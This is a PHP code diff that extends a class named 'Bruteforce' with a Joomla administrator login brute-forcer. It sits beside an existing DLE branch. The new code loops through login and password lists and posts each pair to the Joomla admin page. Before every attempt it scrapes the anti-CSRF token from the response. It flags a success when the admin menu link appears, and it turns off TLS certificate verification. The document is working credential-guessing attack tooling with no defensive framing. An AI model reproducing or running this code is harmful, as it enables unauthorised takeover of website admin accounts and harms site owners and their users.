@@ -22,8 +22,13 @@ class Bruteforce extends Main
         $passwords = $source['passwords'];
         curl_setopt($this->ch, CURLOPT_POST, 1);
         curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, false);
+        curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION, 1);
+        //curl_setopt($this->ch, CURLOPT_COOKIESESSION, 1);
+        curl_setopt($this->ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+        curl_setopt($this->ch, CURLOPT_COOKIEFILE, 'cookie.txt');
         curl_setopt($this->ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, 0);
 
         // die();
         switch ($this->type) {
@@ -33,13 +38,14 @@ class Bruteforce extends Main
             case "dleBrute":
                 $this->startBruteDle($logins, $passwords);
                 break;
+            case "joomlaBrute":
+                $this->startBruteJoomla($logins, $passwords);
+                break;
         }
 
 
         print_r($logins);
         print_r($passwords);
-
-
         //curl_setopt($ch, CURLINFO_HEADER_OUT, 1);
         //curl_setopt($ch, CURLOPT_NOBODY, 1);
 
@@ -87,6 +93,55 @@ class Bruteforce extends Main
             }
             //die();
         }
+
+    }
+
+    function startBruteJoomla($logins, $passwords)
+    {
+        $key = $this->getKey();
+
+        curl_setopt($this->ch, CURLOPT_URL, $this->target . "/administrator/index.php");
+        foreach ($logins as $login) {
+            foreach ($passwords as $password) {
+
+                $postData = "username=$login&passwd=$password&task=login&option=com_login&$key=1";
+                //echo $postData;
+                curl_setopt($this->ch, CURLOPT_POSTFIELDS, $postData);
+                $content = curl_exec($this->ch);
+                $key = $this->getKey($content);
+                //echo $content."\n";
+                // $httpcode = curl_getinfo($this->ch, CURLINFO_HTTP_CODE);
+                //echo $httpcode."\n";
+                if (strstr($content, "/administrator/index.php?option=com_menus"))
+                    array_push($this->result[$this->scid], array("login" => $login, "password" => $password));
+            }
+        }
+
+
+    }
+
+    function getKey($content = "")
+    {
+        $key = "";
+        if ($content == "") {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_COOKIESESSION, 1);
+            curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
+            curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
+            curl_setopt($ch, CURLOPT_URL, $this->target . "/administrator/");
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0");
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+            $content = curl_exec($ch);
+            curl_close($ch);
+        }
+        preg_match('/name="([\w\d]{32})"/', $content, $m);
+        if (isset($m[1]))
+            $key = $m[1];
+
+        return $key;
 
     }
 
